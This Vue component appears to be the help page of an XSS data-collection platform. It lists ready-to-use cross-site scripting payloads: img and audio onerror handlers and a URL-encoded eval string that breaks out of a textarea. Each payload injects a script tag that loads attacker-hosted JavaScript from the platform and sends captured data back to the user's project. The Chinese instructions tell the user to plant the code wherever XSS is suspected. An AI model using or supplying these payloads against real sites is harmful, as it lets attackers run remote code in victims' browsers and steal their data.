<style>
.help-content {
    display: flex;
}
.help-view {
    width: 100%;
    min-height: calc(100vh - 6rem);
    background: #fff;
    margin-left: 1rem;
    box-shadow: 0 0 .5rem #d0d0d0;
}
.help-title-box {
    width: 100%;
    padding-right: 1rem;
    margin-right: 1rem;
}
.help-title {
    border: none;
    border-bottom: 1px solid #ccc;
    outline: none;
    font-size: 1rem;
    padding: .2rem .5rem;
    width: 100%;
}
.help-row {
    padding: 0 1rem;
}
.help-item {
    display: flex;
    color: #333;
    padding: .5rem;
}
.help-code {
    width: 100%;
    font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
    font-size: .8rem;
    color: #505050;
}
.help-sub {
    flex-shrink: 0;
    font-size: .8rem;
    line-height: 1rem;
    color: #ccc;  
}
.help-state {
    display: inline-block;
    width: 5rem;
    color: #8BC34A;
}
.help-state.used {
    color: #ccc;
}
.help-time {
    display: inline-block;
    width: 5rem;
    text-align: right;
}
.help-row-code {
    word-break: break-all;
    background: #3e3e3e;
    padding: 1rem;
    margin: .5rem 0;
    font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
    font-size: .8rem;
    color: #fff;
}
</style>

<template>
    <div class="help-content">
        <div class="help-view">
            <div class="card-title">
                <div class="help-title-box">
                    XSS 指南
                </div>
            </div>
            <div class="help-row" v-for="payload in payloads">
                <div class="help-row-title">{{payload.title}}</div>
                <div class="help-row-code">{{projectFormater(payload.code, payload.encode)}}</div>
            </div>
        </div>
    </div>
</template>

<script>
export default {
    name: 'help',
    data () {
        return {
            project:{
                serverUrl: window.location.origin,
                alias: '23333'
            },
            payloads: [{
                title: `将如下代码植入怀疑出现xss的地方，即可在 项目 中接收到回传数据`,
                code: `<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='{_siteUrl}/code?id={_projectId}';>`
            }, {
                title: `或者用它`,
                code: `<audio controls="controls">
                          <source src="foo.wav" onerror=s=createElement('script');body.appendChild(s);s.src='{_siteUrl}/code?id={_projectId}';type="audio/wav">
                        </audio>`
            }, {
                title: `又或者这样：`,
                encode: true,
                code: `</textarea>'"><img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22{_siteUrl}%2Fcode%3Fid%3D{_projectId}%26r%3D%22%2BMath.random%28%29%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//>`
            }, {
                title: `上面的方式核心都是执行下面的方法创建 script 标签`,
                code: `s=document.createElement('script');document.body.appendChild(s);s.src='{_siteUrl}/code?id={_projectId}'`
            }, {
                title: `总之任意方式能使下面的 Js 能够被加载并执行`,
                code: '{_siteUrl}/code?id={_projectId}'
            }]
        }
    },
    mounted () {
        this.project.alias = this.$route.query.alias ? this.$route.query.alias : '这里填写你的项目id'
    },
    methods: {
        projectFormater (str, urlEncode) {
            if (!urlEncode) return str.replace(/{_siteUrl}/g, this.project.serverUrl).replace(/{_projectId}/g, this.project.alias)
            return str.replace(/{_siteUrl}/g, encodeURIComponent(this.project.serverUrl)).replace(/{_projectId}/g, escape(this.project.alias))
        }
    }
} 
</script>